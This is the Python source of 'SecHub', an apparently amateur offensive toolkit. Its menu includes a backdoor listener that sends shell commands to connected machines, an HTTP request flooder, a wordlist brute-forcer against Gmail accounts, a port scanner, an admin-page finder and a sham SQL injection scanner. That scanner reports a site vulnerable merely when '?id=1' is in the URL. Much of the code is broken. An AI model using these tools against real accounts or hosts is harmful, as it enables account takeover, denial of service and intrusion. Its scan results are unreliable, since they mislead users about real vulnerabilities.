'''
				Welcome to SecHub
				------------------
	SecHub is an Open Source Security Tool Kit developed for Pen-Testers,
Hackers, and Security Reasearches. This tool was developed by Josh,
(Yeh, just Josh).

	This peice of Software is meant to be used for educational purposes only.
SecHub is simply ethical and should be used simply good, not for bad. The Developer
of this product is not to be held responsible for misuse of this tool.

	Finally, SecHub is in it's early stages of development, so please report 
any bugs to the gitHub Repository. Now go Hack The Planet!
												    

-SecHub Developer,
												      
												      
Josh
												       
'''

##Libraries and Modules##
##---------------------##

import os
import sys
import socket
import subprocess

from termcolor import colored, cprint
from datetime import datetime
from urllib2 import  Request, urlopen, URLError, HTTPError

import time
import hashlib
import smtplib
import threading

def secHub():
	cprint("""
		  ______                       __    __            __       
	 	 /      \                     /  |  /  |          /  |      
		/$$$$$$  |  ______    _______ $$ |  $$ | __    __ $$ |____  
		$$ \__$$/  /      \  /       |$$ |__$$ |/  |  /  |$$      \ 
		$$      \ /$$$$$$  |/ $$$$$$$/$$    $$ |$$ |  $$ |$$$$$$$ |
	 	$$$$$$|$$ $$|    $$|          $$$$$$$$ |$$$$ |  $$$|     $$|
		/  \__ $$ |$$$$$$$$/$$ \_____ $$ |   $$ |$$ \__$$ |$$ |__$$|
		$$    $$/ $$        |$$     | $$ |   $$ |$$    $$/ $$   $$/ 
	 	 $$$$$$/   $$$$$$$/   $$$$$$$/$$/    $$ /$$$$$$/   $$$$$$$/  
	                                                            
		 		 Open Source Security Kit 
				     Version :: 1.05

				    Developed By Josh
	                                                            
	                                                            
		

	      """, 'red', attrs=['bold'])



def PlatformCheck():
	if sys.platform == 'win32':
		cprint("\t[!] Windows Detected! secHub is Built For Linux. ", 'red')  ##Windows 32-bit Check

	if sys.platform == 'win64':
		cprint("\t[!] Windows Detected! secHub is Built For Linux. ", 'red')  ##Windows 64-bit Check

	else:
		cprint("\t[+] Unix/Linux Kernel Detected...\n", 'green')  ##Nothing Beats Linux!

PlatformCheck()
time.sleep(1)
	
def sockListen():
	global host
	global port
	global s
	host = ''
	port = input("\t() Enter a Port to Listen On: ")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					##Creates Socket
	try:
		s.bind((host, port))

	except socket.error as e:
		colored("\t[-] Bind Error: " + str(e), 'red')
		return False
	

	try:
		os.system('clear')
		cprint("\t[*] Binding Socket To Port: " + str(port), 'green')
		s.listen(5)
		time.sleep(3)

		cprint("\t[!] Listening For Incoming Intervals", 'blue')
		time.sleep(3)
		cprint("\t[+] Awaiting Connection on LAN", 'blue')

	except socket.error as e:
		print(str(e))

	except KeyboardInterrupt:
		print("\n\t[-] User Aborted! ")
		sys.exit(0)

def sockAccept():

	try:
		while True:
			conn, addr = s.accept()	  ##Accepts Connection from Client
			print("\t[+] Connection With: " + str(addr[0]) + ":" + str(addr[1])) 
			send_commands(conn)
			conn.close()

	except socket.error as e:
		print(str(e))

	except KeyboardInterrupt:
		print("\n\t[-] User Aborted! ")
		sys.exit(0)


def send_commands(conn):
	try:
		while True:
			command = raw_input("\n\tShell> ")   ##Reads Process and opens up Prompt
			if 'kill' in command:
				conn.close()
				s.close()
				break
				return None

			enter_key_on_press = ""

			if enter_key_on_press in command:
				return send_commands(conn)

			if len(str.encode(command)) > 0:
			
 	                	conn.send(str.encode(command))

        	        	client_responce = str(conn.recv(1024))

                		print(client_responce)

 			else:
				conn.send(command)
				print conn.recv(1024)

	except socket.error as x:
		print(str(x))

	except Exception:
		cprint("\t[-] An Error in the Command Shell Has Occured.", 'red')

	except KeyboardInterrupt:
		print("\n\n\t[*] User Aborted! ")
		
		sys.exit(0)


def detectNmap():
	try:
		nmap_boolean = True

		check_package = subprocess.call("nmap")
		os.system('clear')
		print("\tNmap Found!...\n ")

	except OSError as e:
		cprint("\t[!] Error: Nmap Not found...\n", 'red')
		nmap_boolean = False

		try:
			print("\t[*] Intalling it For You...")

			os.system('sudo apt-get install nmap')
			return detectNmap()

		except:
			raise
			nmap_boolean = False
			return False
		

	except KeyboardInterrupt:
		print("\n\t[-] User Aborted! ")

	

def nmapBasic():
	nmap_host = raw_input("\t(*) Enter HOST/LHOST To Scan: ")
	start_scan = os.system('sudo nmap -sS -sV ' + nmap_host +'/24')


def UnleashTheBeast():

	try: 	
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((beast_input, 80))
		ip = socket.gethostbyname(beast_input)
		time.sleep(1)
		 			
		cprint("\t[*] Flooding " + ip + " with " + troll_input + " Packets." , 'green')
		s.send("\tGET /" + troll_input + " HTTP/1.1\r\n")
		s.send("\tHOST: " + beast_input + "\r\n\r\n");
		s.close()
		
		
		
	except socket.error as msg:
		print(str(msg))

	except KeyboardInterrupt:
		cprint("\n\t[!] User Aborted Flooding!", 'red')
		sys.exit(0)


def md5Hashing():

	try:
		hash_in = raw_input("\t() Please Enter a Word/String To Hash: ")
		print("\t[*] Hashing...")
		time.sleep(0.5)

		md5_encode = hashlib.md5(hash_in.encode())
		digested_hash = md5_encode.hexdigest()
		print("\t" + digested_hash)

	except:
		print("\t[-] Could Not Get Hash for {}".format(hash_in))

def gmailBruteForce():
	smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
	smtp_server.ehlo()
	smtp_server.starttls()

	target = raw_input("\t() Enter The Targets Email Address: ")
	passwfile = raw_input("\t() Enter the Password File Path: ")
	passwfile = open(passwfile, "r")

	for password in passwfile:
		try:
			smtp_server.login(target, password)
			cprint("\t\n[+] Password Found!: %s " % password, 'green')
			break

		except smtplib.SMTPAuthenticationError:
			cprint("\t[*] Trying Password: %s" % password, 'red')

def portScan():

	server = raw_input(colored("() Enter a Website/IP to Scan: ", 'blue'))

	try: 
		serverIP = socket.gethostbyname(server)

	except socket.gaierror:
		cprint("[-] Cannot Resolve Hostname", 'red')

	print "-" * 60
	cprint("[!] Please Wait Scanning Remote Host " + serverIP, 'red')
	print "-" * 60
	
	t1 = datetime.now()

	try:
		for port in range(1, 1024):
			 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			 result = sock.connect_ex((serverIP, port))

			 if result == 0:
			 	cprint("[+] Port {}:     Open".format(port), 'green')

		         elif result == 1:
			 	cprint("[-] Port {}:     Closed".format(port), 'blue')

			 sock.close()

	except socket.error as w:
		cprint("[-] Could Not Connect to the Remote Host", 'blue')

	except socket.gaierror:
		cprint("[-] Could Not Resolve Hostname", 'red')
	
	except KeyboardInterrupt:
		cprint("\n[-] User Aborted! ", 'red')
		sys.exit()

	except:
		cprint("\n\n\t[!] An Unknown Error Has Occured!", 'red')

	t2 = datetime.now()
	total = t2 - t1

	cprint('\n\t[+]Scanning Complete' + total, 'blue')


def adminPanelFinder():

	f = open("link.txt", 'r')
	os.system('clear')

	link = raw_input(colored("\t(*) Enter Target Website: ", 'blue'))
	cprint("\t\n[*] Availible Panels: \n\n", 'yellow')

	while True:
		sub_link = f.readline()
		if not sub_link:
			break

		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)

		try:
			response = urlopen(req)

		except HTTPError as e:
			continue

		except URLError as w:
			continue

		except KeyboardInterrupt:
			cprint("\t\n[-] User Aborted Process!", 'red')
			sys.exit(0)

		else:
			cprint("\t[+] Success => " + req_link, 'green')

def sqlScanner():

	global source
	
	sql_errors = [
			"error in your SQL syntax : SQL syntax error",
			"Query failed : Query failed",
			"supplied argument is not a valid MySQL result resource in Bad argument",
			"Microsoft JET Database Engine error 80040e14 : JET DBE error",
			"Error:unknown Unknown error",
			"Fatal error : Fatal error",
			"mysql_fetch : MySQL fetch",
			"Syntax error : Syntax error"
	]

	os.system('clear')

	vuln = "?id=1"

	target = raw_input(colored("\t(*) Enter Website Target(Full URL): ", 'blue'))

	cprint("\t[*] Starting Scan... ", 'green')
	start_time = time.time()
	time.sleep(1)

	cprint("\t[!] Time Started: " + str(start_time) + "\n", 'blue')
	time.sleep(1)
		
	source = ""

	try:
		source = urllib2.urlopen(target+"'", timeout=5).read()

	except KeyboardInterrupt:
		cprint("\n\t[!] User Aborted Scan! ", 'red')
		sys.exit(0)

	except:
		pass

	for error in sql_errors:

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[0] + "'", 'yellow')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[1] + "'", 'red')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[2] + "'", 'red')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[3] + "'", 'blue')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[4] + "'", 'blue')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[5] + "'", 'green')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[6] + "'", 'green')

		time.sleep(1)
		cprint("\t[*] Checking Parameter: " + "'" + sql_errors[7] + "'", 'yellow')
		break


	if vuln in target:
		time.sleep(2)
		cprint("\n\t[+] Target is Vulnerable To SQL Injection! ", 'magenta')
		return True

	elif vuln not in target:
		cprint("\n\t[-] Target is Not Vulnerable to SQL", 'red')
		return False
		
def Options():

	cprint("\t1: Listener and Backdoor\n\t2: Scan Network With Nmap\n\t3: Website/IP Stresser\n\t"
		"4: MD5 Hashing\n\t5: Gmail BruteForce\n\t6: Port Scanner\n\t7: Website Admin Panel Finder\n\t8: SQL Scanner\n\t"
		"9: Exit" , 'blue')


	
def main():
	
	os.system('clear')
	secHub()

	Options()

	start_script_input = raw_input(colored("\n\n\troot@secHub:~# ", 'yellow', attrs=['bold']))
	print start_script_input
	
	if start_script_input == '1':
		os.system('clear')
		time.sleep(0.5)
		sockListen()
		sockAccept()

	if start_script_input == '2':
		secHub()
		detectNmap()
		nmapBasic()
		os.system('clear')
		return main()

	if start_script_input == '3':
		global beast_input
		global troll_input
		os.system('clear')

		beast_input = raw_input(colored("\t() Enter IP/Website To Flood: ", 'blue'))
		print beast_input
		os.system('clear')

		troll_input = raw_input(colored("\t() Packet Number: ", 'blue'))
		print troll_input
		os.system('clear')

		print("\n\t[*] Attacking " + beast_input + "...")
		time.sleep(1)

		for x in range(1, 1000):
			UnleashTheBeast()
				
	if start_script_input == '4':
		os.system('clear')
		md5Hashing()
		hashinput = raw_input(colored("() Press 1 to Return to Main Menu: ", 'green'))
		print hashinput
		
		try:
			if hashinput == '1':
				return main()

		except NameError:
			cprint("[-] Unknown Character! ", 'red')

		except Exception:
			print hashinput

	if start_script_input == '5':
		os.system('clear')
		secHub()
		gmailBruteForce()
		return main()

	if start_script_input == '6':
		os.system('clear')
		portScan()
			
	if start_script_input == '7':
		adminPanelFinder() 

	if start_script_input == '8':
		os.system('clear')
		sqlScanner()

	if start_script_input == '9':
		sys.exit(0)


if __name__ == "__main__":
	main()
